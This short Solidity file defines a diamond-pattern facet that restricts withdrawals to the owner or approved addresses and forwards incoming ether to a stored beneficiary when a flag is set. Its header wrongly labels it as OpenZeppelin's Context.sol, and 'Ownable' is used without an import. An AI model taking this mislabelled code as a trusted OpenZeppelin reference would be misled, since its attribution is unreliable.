// SPDX-License-Identifier: UNLICENSED
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;
import "./TestLib.sol";
contract _mergeActionFacet is Ownable {
    modifier allowedToWithdraw() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            msg.sender == owner() || ds.withdrawApprovals[msg.sender],
            "WITHDRAW APPROVED ONLY!"
        );
        _;
    }

    function _mergeAction() internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.forwarding) {
            (bool sent, ) = ds.beneficiary.call{value: msg.value}("");
            require(sent, "FAILURE");
        }
    }
}
